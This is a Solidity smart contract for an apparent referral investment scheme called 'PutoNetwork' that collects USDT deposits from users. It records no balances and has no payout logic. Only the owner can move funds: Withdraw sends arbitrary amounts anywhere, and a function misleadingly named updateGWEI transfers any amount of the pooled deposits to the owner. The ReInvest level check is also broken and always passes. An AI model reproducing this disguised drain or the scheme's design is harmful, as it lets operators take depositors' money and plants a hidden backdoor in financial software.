//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract PutoNetwork {
    IERC20 public usdt;
    struct User {
        uint id;
        address referrer;
    }  
    mapping(address => User) public users;
    uint public lastUserId = 2;
    
    address public id1=0xc3db2BAD0D2155B1f274bDC55eBf4704E4563D8F;
    address feeWallet=0x01F0F9564b58b0ba6589200be178f88eE03f7C9E;
    address[3] public id2=[0xcd229319E525790cE2548AC785f7c0577fF1aC97,0x4985Acb94985e6Ba7941413aD59070d8841417d8,0x6B543442e0Ca7741839A8777240D5D195033fF94];
    address owner;
    address creation;
    mapping(uint8 => uint) public packagePrice;  
    event Registration(address indexed user, address indexed referrer,uint8 level);
    event Upgrade(address indexed user, uint8 level);
    event withdraw(address indexed user,uint256 value);
    
    constructor(address _usdtAddr,address _owner) public {   
        creation=msg.sender;
        owner=_owner;
        usdt = IERC20(_usdtAddr);
        User memory user = User({
            id: 1,
            referrer: address(0)
        });
        users[id1] = user;
        packagePrice[1] = 25e6;
        packagePrice[2] = 50e6;
        packagePrice[3] = 100e6;
        packagePrice[4] = 200e6;
        packagePrice[5] = 400e6;
        packagePrice[6] = 5e6;
    }
    function init() external{
        require(msg.sender==creation,"Only contract owner"); 
        for (uint8 i = 0; i < 3; i++) {
            registration(id2[i], id1,1);
            buyNewLevel(id2[i],2);
            buyNewLevel(id2[i],3);
            buyNewLevel(id2[i],4);
            buyNewLevel(id2[i],5);
            buyNewLevel(id2[i],6);
        }
    }
    function Invest(address referrerAddress) external {
        usdt.transferFrom(msg.sender, address(this), packagePrice[1]);
        registration(msg.sender, referrerAddress,1);
    }
    function ReInvest(uint8 level) external{        
        usdt.transferFrom(msg.sender, address(this),packagePrice[level]);
        require(level >= 2 || level <= 5, "invalid level");
        buyNewLevel(msg.sender,level);
    }
    function BuyBooster() external {
        usdt.transferFrom(msg.sender, address(this), packagePrice[5]);
        buyNewLevel(msg.sender,6);
    }
    function buyNewLevel(address userAddress,uint8 level) private {
        require(isUserExists(userAddress), "user is not exists. Register first.");
        emit Upgrade(userAddress,level);
    }
    
    function registration(address userAddress, address referrerAddress,uint8 level) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress
        });
        
        users[userAddress] = user;
        users[userAddress].referrer = referrerAddress;        
        lastUserId++;
        emit Registration(userAddress, referrerAddress,level);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function Withdraw(address _user,uint256 _payout,uint _fee) public
    {
        require(msg.sender==creation,"Only contract owner"); 
        usdt.transfer(_user,_payout);  
        usdt.transfer(feeWallet,_fee);
        emit withdraw(_user,_payout);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        usdt.transfer(msg.sender, _amount);  
    }
}